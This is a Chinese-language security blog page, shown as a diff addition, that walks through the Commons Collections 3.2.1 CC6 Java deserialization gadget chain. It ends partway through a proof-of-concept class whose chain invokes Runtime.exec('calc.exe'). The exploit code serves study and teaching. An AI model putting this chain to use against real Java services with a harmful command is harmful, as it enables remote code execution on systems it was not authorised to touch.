@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="环境\rCC6无jdk限制，本次使用jdk8u472，common-collections要求3.2.1\n3.2.1源码\nhttps://maven.aliyun.com/repository/public/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1-sources.jar\nTransformers\rTransformer基类具有transform接口\nChainedTransform(Transformer[]).transform 对于自身所持有的transformer对象依次调用transform方法，并将调用返回结果作为下一次调用的参数\npublic Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object; } ConstantTransformer.transform 直接返回构造参数\npublic ConstantTransformer(Object constantToReturn) {\rsuper();\riConstant = constantToReturn;\r}\rpublic Object transform(Object input) {\rreturn iConstant;\r} InvokeTransformer.transform 通过反射调用input类的特定方法\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } catch (NoSuchMethodException ex) { throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; does not exist&#34;); } catch (IllegalAccessException ex) { throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; cannot be accessed&#34;); } catch (InvocationTargetException ex) { throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; threw an exception&#34;, ex); } } 总体流程如下\n">
+<title>JavaSec CC6</title>
+
+<link rel='canonical' href='https://byebydoggy.github.io/post/2025/javasec-cc6/'>
+
+<link rel="stylesheet" href="/scss/style.min.4d36f8dc1fd48129e1635deb4b8eb2870fa09474f7280c4cb606d40b2526994b.css"><meta property='og:title' content="JavaSec CC6">
+<meta property='og:description' content="环境\rCC6无jdk限制，本次使用jdk8u472，common-collections要求3.2.1\n3.2.1源码\nhttps://maven.aliyun.com/repository/public/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1-sources.jar\nTransformers\rTransformer基类具有transform接口\nChainedTransform(Transformer[]).transform 对于自身所持有的transformer对象依次调用transform方法，并将调用返回结果作为下一次调用的参数\npublic Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object; } ConstantTransformer.transform 直接返回构造参数\npublic ConstantTransformer(Object constantToReturn) {\rsuper();\riConstant = constantToReturn;\r}\rpublic Object transform(Object input) {\rreturn iConstant;\r} InvokeTransformer.transform 通过反射调用input类的特定方法\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } catch (NoSuchMethodException ex) { throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; does not exist&#34;); } catch (IllegalAccessException ex) { throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; cannot be accessed&#34;); } catch (InvocationTargetException ex) { throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; threw an exception&#34;, ex); } } 总体流程如下\n">
+<meta property='og:url' content='https://byebydoggy.github.io/post/2025/javasec-cc6/'>
+<meta property='og:site_name' content='Byebyedoggy'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Java' /><meta property='article:published_time' content='2025-11-21T11:45:25&#43;08:00'/><meta property='article:modified_time' content='2025-11-21T11:45:25&#43;08:00'/><meta property='og:image' content='https://byebydoggy.github.io/cover.png' />
+<meta name="twitter:title" content="JavaSec CC6">
+<meta name="twitter:description" content="环境\rCC6无jdk限制，本次使用jdk8u472，common-collections要求3.2.1\n3.2.1源码\nhttps://maven.aliyun.com/repository/public/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1-sources.jar\nTransformers\rTransformer基类具有transform接口\nChainedTransform(Transformer[]).transform 对于自身所持有的transformer对象依次调用transform方法，并将调用返回结果作为下一次调用的参数\npublic Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object; } ConstantTransformer.transform 直接返回构造参数\npublic ConstantTransformer(Object constantToReturn) {\rsuper();\riConstant = constantToReturn;\r}\rpublic Object transform(Object input) {\rreturn iConstant;\r} InvokeTransformer.transform 通过反射调用input类的特定方法\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } catch (NoSuchMethodException ex) { throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; does not exist&#34;); } catch (IllegalAccessException ex) { throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; cannot be accessed&#34;); } catch (InvocationTargetException ex) { throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; threw an exception&#34;, ex); } } 总体流程如下\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://byebydoggy.github.io/cover.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column compact"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_8ac7c2653184b428.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Byebyedoggy</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/2025/javasec-cc6/">
+                
+                    <img src="/cover.png" loading="lazy" alt="Featured image of post JavaSec CC6" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java/" >
+                Java
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/2025/javasec-cc6/">JavaSec CC6</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published" datetime='2025-11-21T11:45:25&#43;08:00'>Nov 21, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="环境">环境
+</h1><p>CC6无jdk限制，本次使用jdk8u472，common-collections要求3.2.1</p>
+<p>3.2.1源码</p>
+<p><a class="link" href="https://maven.aliyun.com/repository/public/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1-sources.jar"  title="CommonCollections源码"
+     target="_blank" rel="noopener"
+    >https://maven.aliyun.com/repository/public/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1-sources.jar</a></p>
+<h1 id="transformers">Transformers
+</h1><p>Transformer基类具有transform接口</p>
+<p>ChainedTransform(Transformer[]).transform 对于自身所持有的transformer对象依次调用transform方法，并将调用返回结果作为下一次调用的参数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">transform</span>(Object object) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> iTransformers.<span style="color:#a6e22e">length</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        object <span style="color:#f92672">=</span> iTransformers<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>.<span style="color:#a6e22e">transform</span>(object);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> object;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>ConstantTransformer.transform 直接返回构造参数</p>
+<pre tabindex="0"><code>public ConstantTransformer(Object constantToReturn) {
+        super();
+        iConstant = constantToReturn;
+    }
+
+public Object transform(Object input) {
+    return iConstant;
+}
+</code></pre><p>InvokeTransformer.transform 通过反射调用input类的特定方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">InvokerTransformer</span>(String methodName, Class<span style="color:#f92672">[]</span> paramTypes, Object<span style="color:#f92672">[]</span> args) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>();
+</span></span><span style="display:flex;"><span>        iMethodName <span style="color:#f92672">=</span> methodName;
+</span></span><span style="display:flex;"><span>        iParamTypes <span style="color:#f92672">=</span> paramTypes;
+</span></span><span style="display:flex;"><span>        iArgs <span style="color:#f92672">=</span> args;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">transform</span>(Object input) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (input <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        Class cls <span style="color:#f92672">=</span> input.<span style="color:#a6e22e">getClass</span>();
+</span></span><span style="display:flex;"><span>        Method method <span style="color:#f92672">=</span> cls.<span style="color:#a6e22e">getMethod</span>(iMethodName, iParamTypes);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> method.<span style="color:#a6e22e">invoke</span>(input, iArgs);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (NoSuchMethodException ex) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> FunctorException(<span style="color:#e6db74">&#34;InvokerTransformer: The method &#39;&#34;</span> <span style="color:#f92672">+</span> iMethodName <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on &#39;&#34;</span> <span style="color:#f92672">+</span> input.<span style="color:#a6e22e">getClass</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; does not exist&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (IllegalAccessException ex) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> FunctorException(<span style="color:#e6db74">&#34;InvokerTransformer: The method &#39;&#34;</span> <span style="color:#f92672">+</span> iMethodName <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on &#39;&#34;</span> <span style="color:#f92672">+</span> input.<span style="color:#a6e22e">getClass</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; cannot be accessed&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (InvocationTargetException ex) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> FunctorException(<span style="color:#e6db74">&#34;InvokerTransformer: The method &#39;&#34;</span> <span style="color:#f92672">+</span> iMethodName <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on &#39;&#34;</span> <span style="color:#f92672">+</span> input.<span style="color:#a6e22e">getClass</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; threw an exception&#34;</span>, ex);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>总体流程如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 当前链内容:Runtime</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> InvokerTransformer(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;getMethod&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>, Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>}
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 当前链内容:Runtime.getMethod</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> InvokerTransformer(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;invoke&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>}
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 当前链内容:Runtime.getMethod(&#39;invoke&#39;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Windows：calc.exe | Linux：touch /tmp/cc6_success</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> InvokerTransformer(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;exec&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>},
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc.exe&#34;</span>}
+</span></span><span style="display:flex;"><span>        ),
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 当前链内容:Runtime.invoke(&#39;exec&#39;,&#39;cacl.exe&#39;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> ConstantTransformer(<span style="color:#66d9ef">null</span>)
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>Transformer chain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span></code></pre></div><h1 id="触发transformers链">触发Transformers链
+</h1><p>LazyMap</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map <span style="color:#a6e22e">decorate</span>(Map map, Transformer factory) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> LazyMap(map, factory);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#a6e22e">LazyMap</span>(Map map, Factory factory) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>(map);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (factory <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">&#34;Factory must not be null&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">factory</span> <span style="color:#f92672">=</span> FactoryTransformer.<span style="color:#a6e22e">getInstance</span>(factory);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">get</span>(Object key) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// create value for key if key is not currently in the map</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (map.<span style="color:#a6e22e">containsKey</span>(key) <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>            Object value <span style="color:#f92672">=</span> factory.<span style="color:#a6e22e">transform</span>(key);
+</span></span><span style="display:flex;"><span>            map.<span style="color:#a6e22e">put</span>(key, value);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> value;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> map.<span style="color:#a6e22e">get</span>(key);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>触发流程</p>
+<p>使用decorate方法把利用链绑定到Lazymap的factory，如果能调用到lazyMap的get方法即可触发chainedTransformer的transform，成功触发</p>
+<p>完整代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Map innerMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>Map lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(innerMap, chain);
+</span></span></code></pre></div><h1 id="触发lazymap的get方法">触发LazyMap的get方法
+</h1><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>TiedMapEntry entry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap, <span style="color:#e6db74">&#34;testKey&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ===================== 步骤4：构造 HashSet 并绑定 TiedMapEntry =====================</span>
+</span></span><span style="display:flex;"><span>HashSet hashSet <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashSet();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 向 HashSet 添加 TiedMapEntry（反序列化时会调用 entry 的 hashCode 触发 get）</span>
+</span></span><span style="display:flex;"><span>hashSet.<span style="color:#a6e22e">add</span>(entry);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 移除 entry 确保反序列化时重新计算 hashCode</span>
+</span></span><span style="display:flex;"><span>lazyMap.<span style="color:#a6e22e">remove</span>(<span style="color:#e6db74">&#34;testKey&#34;</span>);
+</span></span></code></pre></div><h1 id="完整poc">完整POC
+</h1><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> org.cc6;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashSet;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC6</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ===================== 步骤1：构造恶意 Transformer 调用链 =====================</span>
+</span></span><span style="display:flex;"><span>Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;getMethod&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>, Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>}
+</span></span><span style="display:flex;"><span>                ),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;invoke&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>}
+</span></span><span style="display:flex;"><span>                ),
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// Windows：calc.exe | Linux：touch /tmp/cc6_success</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> InvokerTransformer(
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;exec&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>},
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc.exe&#34;</span>}
+</span></span><span style="display:flex;"><span>                ),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(<span style="color:#66d9ef">null</span>)
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        Transformer chain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ===================== 步骤2：构造 LazyMap 触发 Transformer =====================</span>
+</span></span><span style="display:flex;"><span>Map innerMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        Map lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(innerMap, chain);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ===================== 步骤3：核心修复：用 TiedMapEntry 间接触发 LazyMap.get =====================</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// TiedMapEntry 的 hashCode/equals 方法会调用 LazyMap.get，绕过 HashSet.map 类型限制</span>
+</span></span><span style="display:flex;"><span>TiedMapEntry entry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap, <span style="color:#e6db74">&#34;testKey&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ===================== 步骤4：构造 HashSet 并绑定 TiedMapEntry =====================</span>
+</span></span><span style="display:flex;"><span>HashSet hashSet <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashSet();
